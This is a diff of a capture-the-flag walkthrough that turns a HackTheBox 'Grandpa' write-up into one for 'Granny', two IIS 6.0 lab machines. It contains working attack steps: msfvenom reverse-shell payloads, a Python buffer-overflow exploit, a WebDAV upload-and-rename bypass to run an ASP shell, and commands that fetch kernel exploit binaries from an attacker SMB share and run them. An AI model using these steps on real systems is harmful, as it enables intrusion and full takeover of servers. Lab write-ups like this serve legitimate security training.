@@ -1,120 +1,36 @@
-# [Grandpa](https://app.hackthebox.eu/machines/13)
+# [Granny](https://app.hackthebox.eu/machines/14)
 
 Start with `nmap`:
 
 ```bash
 # find open TCP ports
-sudo masscan -p1-65535 10.10.10.14 --rate=1000 -e tun0 > masscan.txt
+sudo masscan -p1-65535 10.10.10.15 --rate=1000 -e tun0 > masscan.txt
 tcpports=$(cat masscan.txt | cut -d ' ' -f 4 | cut -d '/' -f 1 | sort -n | tr '\n' ',' | sed 's/,$//')
 # TCP deep scan
-sudo nmap -sS -p $tcpports -oA tcp --open -Pn --script "default,safe,vuln" -sV 10.10.10.14 &
+sudo nmap -sS -p $tcpports -oA tcp --open -Pn --script "default,safe,vuln" -sV 10.10.10.15 &
 # TCP quick scan
-sudo nmap -v -sS -sC -F --open -Pn -sV 10.10.10.14
+sudo nmap -v -sS -sC -F --open -Pn -sV 10.10.10.15
 # UDP quick scan
-sudo nmap -v -sU -F --open -Pn -sV --version-intensity 0 10.10.10.14
+sudo nmap -v -sU -F --open -Pn -sV --version-intensity 0 10.10.10.15
 ```
 
 The TCP quick scan returns the following:
 
-![nmap1](./grandpa/nmap1.png)
+![nmap1](./granny/nmap1.png)
 
-Start the following web scanner:
-
-```bash
-nikto -h http://10.10.10.14/ -C all --maxtime=120s --output=nikto.txt
-```
-
-![nikto1](./grandpa/nikto1.png)
-
-Browse to the site manually:
+It seems like the backend website is IIS 6.0? Start the following web scanner:
 
 ```bash
-firefox http://10.10.10.14/
+nikto -h http://10.10.10.15/ -C all --maxtime=120s --output=nikto.txt
 ```
 
-![web1](./grandpa/web1.png)
+![nikto1](./granny/nikto1.png)
 
-Site looks like a default. Start a directroy scanner looking for `asp` or `aspx` pages:
-
-```bash
-ulimit -n 8192 # prevent file access error during gobuster scanning
-gobuster dir -t 50 -r -q -z -o gobuster.txt -x asp,aspx \
-  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-  -u http://10.10.10.14/ &
-```
-
-This does not return many interesting results:
-
-```
-/images (Status: 403)
-/Images (Status: 403)
-/IMAGES (Status: 403)
-/_private (Status: 403)
-```
-
-Maybe WebDAV is enabled?
-
-```bash
-davtest -url http://10.10.10.14/
-```
-
-![dav1](./grandpa/dav1.png)
-
-It seems like WebDAV is enabled but uploading files is not possible. The full `nmap` scan returns more interesting results:
-
-![nmap2](./grandpa/nmap2.png)
-
-Looking at `http://10.10.10.14/postinfo.html` shows the following in the HTML source:
-
-![web2](./grandpa/web2.png)
-
-Some Googling for this shows that the FrontPage info can be found at `http://10.10.10.14/_vti_inf.html`:
-
-![web3](./grandpa/web3.png)
-
-FrontPage does have some vulnerabilities:
-
-- https://insecure.org/sploits/Microsoft.frontpage.insecurities.html
-- https://raw.githubusercontent.com/deepak0401/Front-Page-Exploit/master/README.md
-- https://github.com/andresriancho/w3af/blob/master/w3af/plugins/audit/frontpage.py
-
-However, looking at these results in only dead ends... Next try looking for some web server exploit for IIS 6 (version found from `nikto`):
-
-```bash
-searchsploit iis 6.0
-```
-
-![ss1](./grandpa/ss1.png)
-
-Some of these look promising that require WebDAV since that has already been proven to be enabled:
+This looks like a similar machine [Grandpa](./grandpa.md). Maybe the same exploit 41738 can be used?
 
 - https://www.exploit-db.com/exploits/41738
-  - Exploit PoC just spawns `calc.exe` and does not explain how to modify it?
-- https://www.exploit-db.com/exploits/41992
-  - Seems to be the Metasploit version of exploit 41738 and explains how to modify the payload
 
-It seems like exploit 41738 can be modified to work without Metasploit? Looking at the following Ruby code shows how to generate a new payload:
-
-```ruby
-'Payload' =>
-  {
-    'Space'         => 2000,
-    'BadChars'      => "\x00",
-    'EncoderType'   => Msf::Encoder::Type::AlphanumUnicodeMixed,
-    'DisableNops'   =>  'True',
-    'EncoderOptions' =>
-      {
-        'BufferRegister' => 'ESI',
-      }
-  },
-'DefaultOptions' =>
-  {
-    'EXITFUNC' => 'process',
-    'PrependMigrate' => true,
-  },
-```
-
-This can be made into the following long `msfvenom` command:
+Try to generate a new payload and test it:
 
 ```bash
 msfvenom -p windows/shell_reverse_tcp \
@@ -132,7 +48,7 @@ msfvenom -p windows/shell_reverse_tcp \
          -v shellcode
 ```
 
-Now modify exploit 41738 and change `localhost` to `10.10.10.14` in the payload:
+Save the following Python in `exploit.py`:
 
 ```python
 import time
@@ -260,126 +176,59 @@ payload += shellcode
 payload += b'>\r\n\r\n'
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(('10.10.10.14', 80))
+s.connect(('10.10.10.15', 80))
 s.send(payload)
 time.sleep(1)
 s.close()
 ```
 
-Then set up a listener and try the exploit:
+The run the exploit:
 
 ```bash
 nc -nvlp 6969
 python3 exploit.py
 ```
 
-And this returns a shell but does not give `user.txt`:
+And this returns a shell without `user.txt`:
 
-![user1](./grandpa/user1.png)
+![user1](./granny/user1.png)
 
-Looking at current privledges shows that `SeImpersonatePrivilege` is given. This means that the Juicy Potato series of exploits should work:
-
-- https://github.com/ohpe/juicy-potato
-
-![user2](./grandpa/user2.png)
-
-However, the target seems to be x86 and Windows Server 2003:
-
-![user3](./grandpa/user3.png)
-
-The default Juicy Potato is for x64 only. However, this one will work for x86:
-
-- https://github.com/ivanitlearning/Juicy-Potato-x86
-
-Another problem exists though. This exploit requires a CLSID for the service to abuse. The standard list of CLSIDs does not list Windows Server 2003 and the script to extract them is written in PowerShell:
-
-- https://github.com/ohpe/juicy-potato/tree/master/CLSID
-
-It is possible to find CLSIDs manually in the Windows command prompt without PowerShell:
-
-```
-reg query HKCR\clsid /s 
-reg query HKCR\appid /s 
-```
-
-However, going down this road leads to another dead end as the Juicy Potato for x86 seems to just hang on the target whenever it is ran. Looking around the target does not show any interesting processess running or any special network ports open or any interesting files on the system... Next look for a kernel exploit since the output of `systeminfo` lists no HotFixes. Since the target is running an old OS version, use the older version of the Windows exploit suggester:
-
-- https://github.com/AonCyberLabs/Windows-Exploit-Suggester
+But this seems too easy. Try seeing if it is possible to abuse the WebDav directly:
 
 ```bash
-# save systeminfo output from target into systeminfo.txt
-git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git
-python2.7 Windows-Exploit-Suggester/windows-exploit-suggester.py --update
-python2.7 Windows-Exploit-Suggester/windows-exploit-suggester.py -i systeminfo.txt -d 2020-12-02-mssb.xls --local
+davtest -url http://10.10.10.15/ -cleanup
 ```
 
-![user4](./grandpa/user4.png)
+![dav1](./granny/dav1.png)
 
-Cross-reference this list with the following repo:
+It looks like there is another way into this machine? The backend server is ASP.NET from the `nikto` HTTP header `x-aspnet-version header: 1.1.4322`. However, it is not possible to upload and `asp` or `aspx` files. This can be by-passed with some Googling for `IIS 6 upload ASP over WebDav bypass`:
 
-- https://github.com/SecWiki/windows-kernel-exploits
+- https://book.hacktricks.xyz/pentesting/pentesting-web/put-method-webdav#iis-5-6-webdav-vulnerability
 
-This leads to the following pre-compiled exploits to test:
-
-- https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051
-  - Seems applicable?
-- https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-070
-  - Seems applicable and screenshots seem to be tested on Windows Server 2003
-- https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068
-  - Requires Kerberos so this exploit will not work
-- https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-040
-  - PoC Python code mentions Windows 7 only...
-- https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS09-020
-  - Mentions vulnerability in IIS 6.0 WebDav? The MSDN writeup says the website must have a password protected folder...
-- https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11-011
-  - Seems only valid for Windows XP
-- https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11-080
-  - Seems applicable and screenshots seem to be tested on Windows Server 2003
-
-There are a few contenders but some standout as more probable based on the screenshots in the write-ups:
-
-- https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-070
-- https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11-080
-
-Start with MS14-070 first:
+It seems possible to try and upload an ASP reverse shell as a TXT file and trick the target into renaming it to an ASP file:
 
 ```bash
-# on kali, download and host binary
-wget https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS14-070/MS14-070.rar
-unrar x MS14-070.rar
-sudo impacket-smbserver BUBBA .
-# on target download, and run binary
-copy \\10.10.14.25\BUBBA\MS14-070\MS14-070.exe %TEMP%\MS14-070.exe
-%TEMP%\MS14-070.exe
+# generate reverse shell
+msfvenom -p windows/shell_reverse_tcp \
+         LHOST=10.10.14.25 \
+         LPORT=6969 \
+         -a x86 \
+         -f asp \
+         -o bubba.txt
+# start listener
+nc -nvlp 6969
+# connect to target over webdav
+cadaver http://10.10.10.15/
+# trigger vulnerability
+put bubba.txt
+copy bubba.txt bubba.asp;.txt
 ```
 
-However, this exploit did not work as expected (did not elevate shell to SYSTEM...). Next try MS11-080:
+![dav2](./granny/dav2.png)
 
-```bash
-# on kali, download and host binary
-wget https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS11-080/ms11-080.exe
-sudo impacket-smbserver BUBBA .
-# on target download, and run binary
-copy \\10.10.14.25\BUBBA\ms11-080.exe %TEMP%\ms11-080.exe
-%TEMP%\ms11-080.exe
-```
+Then trigger the shell by browsing to `http://10.10.10.15/bubba.asp;.txt` to get another reverse shell!
 
-However, this exploit did not work as expected (did not create a SYSTEM process). Next try MS15-051:
-
-```bash
-# on kali, download and host binary
-wget https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS15-051/MS15-051-KB3045171.zip
-unzip MS15-051-KB3045171.zip
-sudo impacket-smbserver BUBBA .
-# on target download, and run binary
-copy \\10.10.14.25\BUBBA\MS15-051-KB3045171\ms15-051.exe %TEMP%\ms15-051.exe
-%TEMP%\ms15-051.exe "whoami"
-```
-
-But this does not work as well? From here, switch to a previously used and reliable kernel exploit...
-
-- https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS09-012
-- https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2009/ms09-012
+Looking at the system shows that it is _very_ similar to [Grandpa](./grandpa.md). Use the same kernel exploit to get SYSTEM:
 
 ```bash
 # on kali, download and host binary/payload
@@ -401,5 +250,4 @@ copy \\10.10.14.25\BUBBA\bubba.exe %TEMP%\bubba.exe
 
 And this returns a SYSTEM shell:
 
-![root1](./grandpa/root1.png)
-
+![root1](./granny/root1.png)
